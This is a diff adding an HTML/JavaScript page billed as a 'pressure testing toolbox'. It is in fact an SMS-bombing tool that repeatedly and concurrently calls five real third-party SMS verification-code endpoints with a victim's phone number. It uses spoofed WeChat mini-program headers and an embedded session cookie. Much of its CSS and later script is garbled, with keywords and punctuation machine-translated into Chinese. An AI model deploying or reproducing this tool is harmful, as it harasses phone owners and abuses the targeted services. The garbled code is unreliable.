@@ -1,0 +1,336 @@
+<！doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<元名称=“视口”内容=“宽度=设备宽度，初始比例=1.0”>
+<title>测压工具箱-自定义线程版</title>
+<style>
+/* 样式保持不变，仅调整警告区域样式 */
+.alert{
+背景：#FFEEE；/*加深警告背景色*/
+边框：1px实体#FF6B6B；
+填料：12px；
+}
+/* 其他样式与之前一致 */
+正文{
+字体系列："微软雅黑"，无衬线；
+背景：#F5F5F5；
+显示：柔性；
+弯曲方向：立柱；
+对齐项：居中；
+填料：20px；
+}
+.card{
+背景：白色；
+边界半径：20px；
+填充：25px；
+宽度：90%；
+最大宽度：400px；
+箱形阴影：08px24px rgba(0,0,0,0.1);
+}
+.header{
+文本对齐：居中；
+底边距：20px；
+}
+.header h1{
+font-size:22px；
+颜色：#333；
+底边距：8px；
+}
+.header p{
+颜色：#666；
+font-size:14px；
+}
+.input-group{
+底边距：16px；
+}
+.输入组标签{
+显示：块；
+底边距：6px；
+颜色：#555；
+}
+.输入组输入{
+宽度：100%；
+填料：12px；
+边框：1px实心#DDD；
+边界半径：16px；
+字体大小：15px；
+}
+.btn-group{
+显示：柔性；
+间隙：8px；
+}
+.btn{
+flex:1；
+填料：12px；
+边框：无；
+边界半径：16px；
+字体大小：16px；
+光标：指针；
+}
+.start-btn{
+背景：#007AFF；
+颜色：白色；
+}
+.stop-btn{
+背景：#FF3B30；
+颜色：白色；
+显示：无；
+}
+.response-area{
+margin-top:20px；
+边框：1px实心#DDD；
+边界半径：12px；
+填料：15px；
+最小高度：120px；
+背景：#FFF；
+颜色：#333；
+overflow-y：自动；
+font-size:14px；
+}
+.api1{color：#007AFF；}
+.api2{color：#00CC66；}
+.api3{color：#9C27B0；}
+.api4{color：#FF9500；}/*新增API4颜色*/
+.api5{color：#5856D6；}/*新增API5颜色*/
+.error{color：#FF3B30；}
+.footer{
+margin-top:20px；
+            color: #007AFF;
+            font-size: 13px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header">
+            <h1>欢迎使用测压工具箱v1.0</h1>
+            <p>此版本由沈安制作🎉🎉·
+            此版本由5个接口进行请求（GET/POST）</p> <!-- 更新接口数量说明 -->
+        </div>
+        <div class="alert">
+            ⚠️ 重要警告：<br>
+            1. 浏览器默认限制同一域名并发连接（通常6个），设置过高可能导致请求阻塞<br>
+            2. 5-10线程可能触发服务器反爬机制，导致IP封禁<br>
+            3. 仅允许测试自有资源，违法使用需承担法律责任<br>
+            4. 高频请求会消耗大量网络资源，建议谨慎使用
+        </div>
+        <div class="input-group">
+            <label for="phone">目标手机号</label>
+            <input type="text" id="phone" placeholder="输入11位手机号">
+        </div>
+        <div class="input-group">
+            <label for="threads">单接口并发数（5-10，注意浏览器限制）</label>
+            <input type="number" id="threads" value="5" min="5" max="10">
+        </div>
+        <div class="btn-group">
+            <button class="btn start-btn" id="startBtn">开始持续发送</button>
+            <button class="btn stop-btn" id="stopBtn">停止发送</button>
+        </div>
+        <div class="response-area" id="responseBox">
+            （点击「开始」后显示实时响应）
+        </div>
+    </div>
+    <div class="footer">
+        此工具箱仅供内部测试参考学习，请勿用于违法行为，违者一切责任由你本人承担（使用代表你同意此规则） · 沈安制作🎉🎉2025
+    </div>
+    <script>
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const phoneInput = document.getElementById('phone');
+        const threadsInput = document.getElementById('threads');
+        const responseBox = document.getElementById('responseBox');
+        
+        // 5个接口配置（包含原有3个+新增2个）
+        const APIS = [
+            {
+                name: 'API1',
+                url: 'https://hui.uwork.cn/api/system/captcha/captchaSMS',
+                method: 'GET',
+                paramKey: 'username',
+                headers: {
+                    'Host': 'hui.uwork.cn',
+                    'Connection': 'keep-alive',
+                    'content-type': 'application/json',
+                    'charset': 'utf-8',
+                    'Referer': 'https://servicewechat.com/wx48a8abb5c84baf7c/10/page-frame.html',
+                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-S9280 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.157 Mobile Safari/537.36 XWEB/1380055 MMWEBSDK/20240802 MMWEBID/4530 MicroMessenger/8.0.53.2740(0x2800353F) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android'
+                }
+            },
+            {
+                name: 'API2',
+                url: 'https://worker-api.zhixiangxin.com.cn/sendSmsCode',
+                method: 'GET',
+                paramKey: 'phone',
+                extraParams: { tenantId: 'T0001' },
+                headers: {
+                    'Host': 'worker-api.zhixiangxin.com.cn',
+                    'Connection': 'keep-alive',
+                    'content-type': 'application/json',
+                    'charset': 'utf-8',
+                    'Referer': 'https://servicewechat.com/wx26eed85476139f9c/13/page-frame.html',
+                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-S9280 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.157 Mobile Safari/537.36 XWEB/1380055 MMWEBSDK/20240802 MMWEBID/4530 MicroMessenger/8.0.53.2740(0x2800353F) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android'
+                }
+            },
+            {
+                name: 'API3',
+                url: 'https://zf.zservice.com.cn/weChat/weChat/getSmsCode',
+                method: 'POST',
+                paramKey: 'phoneNumber',
+                headers: {
+                    'Host': 'zf.zservice.com.cn',
+                    'Connection': 'keep-alive',
+                    'content-type': 'application/json',
+                    'charset': 'utf-8',
+                    'Referer': 'https://servicewechat.com/wx48a8abb5c84baf7c/10/page-frame.html',
+                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-S9280 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.157 Mobile Safari/537.36 XWEB/1380055 MMWEBSDK/20240802 MMWEBID/4530 MicroMessenger/8.0.53.2740(0x2800353F) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android'
+                }
+            },
+            // 新增文档2中的接口（API4）
+            {
+                name: 'API4',
+                url: 'https://ylz.yimitongxun.com/mp/sendSmsCode',
+                method: 'POST',
+                paramKey: 'mobile',
+                headers: {
+                    'Host': 'ylz.yimitongxun.com',
+                    'Connection': 'keep-alive',
+                    'content-type': 'application/json',
+                    'charset': 'utf-8',
+                    'Token': '',
+                    'Referer': 'https://servicewechat.com/wx9ebdcac23b1d3331/6/page-frame.html',
+                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-S9280 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.157 Mobile Safari/537.36 XWEB/1380055 MMWEBSDK/20240802 MMWEBID/4530 MicroMessenger/8.0.53.2740(0x2800353F) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+                    'Accept-Encoding': 'gzip, deflate, br'
+                }
+            },
+            // 新增文档3中的接口（API5）
+            {
+                name: 'API5',
+                url: 'https://api.kaisuokuai.com/app/verificationCode_get',
+                method: 'POST',
+                paramKey: 'phoneNumber',
+                extraParams: { client: 'wx' }, // 包含请求体中的client参数
+                headers: {
+                    'Host': 'api.kaisuokuai.com',
+                    'Connection': 'keep-alive',
+                    'content-type': 'application/json',
+                    'charset': 'utf-8',
+                    'Authorization': '',
+                    'cookie': 'connect.sid=s%3AIbS7IuBZZwIYVNBeFPh7W8embujXP4Hb.TfiVkRSE4Gf4XtB%2BSWyt17fn8HudUjg4S0zY8L%2B06ZM',
+                    'appid': 'wx2a261f9ad7577c46',
+                    'Referer': 'https://servicewechat.com/wx2a261f9ad7577c46/2/page-frame.html',
+                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-S9280 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.157 Mobile Safari/537.36 XWEB/1380055 MMWEBSDK/20240802 MMWEBID/4530 MicroMessenger/8.0.53.2740(0x2800353F) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+                    'Accept-Encoding': 'gzip, deflate, br'
+                }
+            }
+        ];
+        let isRunning = false;
+        let batchCount = 0;
+        // 构建请求参数（逻辑不变）
+        function buildRequestOptions(api, phone) {
+            const options = {
+                method: api.method,
+                headers: api.headers,
+                mode: 'cors'
+            };
+            if (api.method === 'GET') {
+                const params = new URLSearchParams();
+                params.append(api.paramKey, phone);
+                if (api.extraParams) {
+                    Object.entries(api.extraParams).forEach(([key, value]) => {
+                        params.append(key, value);
+                    });
+                }
+                return {
+                    url: `${api.url}?${params.toString()}`,
+                    options: options
+                };
+            } else if (api.method === 'POST') {
+                const body = { [api.paramKey]: phone };
+                if (api.extraParams) {
+                    Object.assign(body, api.extraParams); // 合并额外参数
+                }
+                options.body = JSON.stringify(body);
+                return {
+                    url: api.url,
+                    options: options
+                };
+            }
+        }
+        // 发送一批请求（逻辑不变）
+        function sendBatch(phone, threadCount) {
+            const requests = [];
+            APIS.forEach(api => {
+                for (let i = 0; i < threadCount; i++) {
+                    const { url, options } = buildRequestOptions(api, phone);
+                    const req = fetch(url, options)
+                        .then(res => {
+返回res.text().then(text=>({
+API:api.name，
+状态：res.status，
+内容：文本
+}));
+})
+.catch(err=>({
+API:api.name，
+错误：err.message
+}));
+requests.push(req)；
+}
+});
+return Promise.all(requests)；
+}
+// 递归循环发送（逻辑不变）
+函数loopSend(phone，threadCount){
+if(！isrunning)返回；
+batchCount++；
+sendBatch(电话、线程计数)
+.then(响应=>{
+Const batchInfo=responses.map(resp=>{
+if(resp.error){
+return'<span class="error">[${resp.api}]失败：${resp.error.slice(0，30)}...</span>`;
+}else{
+return'<span class="${resp.API.ToLowerCase()}">[${resp.API}]状态：${resp.status}，响应：${resp.content.slice(0，50)}...</span>`;
+}
+}).join('<br>')；
+responseBox.innerHTML+='<div>批次${batchCount}：${batchInfo}</div>'；
+responseBox.scrollTop=responseBox.scrollHeight；
+loopSend(电话，threadCount)；
+})
+.catch(err=>{
+responseBox.innerHTML+='<div class="error">批次${batchCount}异常：${err}</div>'；
+if(isrunning){
+loopSend(电话，threadCount)；
+}
+});
+}
+// 开始按钮逻辑（不变）
+startBtn.addEventListener('click'，()=>{
+const phone=phoneInput.value.trim()；
+const threadCount=parseInt(threadsInput.value)；
+if(！/^1\d{10}$/.test(电话)){
+警惕的('请输入有效的11位手机号！')；
+返回；
+}
+if(threadCount<5||threadCount>10){
+alert('并发数必须在5-10之间！')；
+返回；
+}
+isrunning=true；
+batchCount=0；
+responseBox.innerHTML='开始持续发送请求...<br>'；
+startBtn.style.display='none'；
+stopBtn.style.display='block'；
+loopSend(电话，threadCount)；
+});
+// 停止按钮逻辑（不变）
+stopBtn.addEventListener('click'，()=>{
+isrunning=false；
+startBtn.style.display='block'；
+stopBtn.style.display='none'；
+responseBox.innerHTML+='<div style="color：#FF9500；">已停止持续发送</div>'；
+});
+</script>
+</body>
+</html>
